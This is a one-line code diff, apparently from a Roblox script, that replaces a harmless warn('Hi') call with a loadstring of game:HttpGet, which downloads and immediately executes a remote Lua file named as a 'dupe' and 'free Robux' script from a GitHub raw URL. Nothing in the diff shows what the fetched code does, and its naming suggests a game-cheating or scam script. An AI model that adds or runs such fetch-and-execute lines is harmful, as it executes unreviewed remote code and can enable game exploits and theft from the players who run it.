@@ -1,1 +1,1 @@
-warn("Hi")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bogunce/HUGE-A-TRON-DUPE/main/FreeRobuxEggMain.lua", true))()
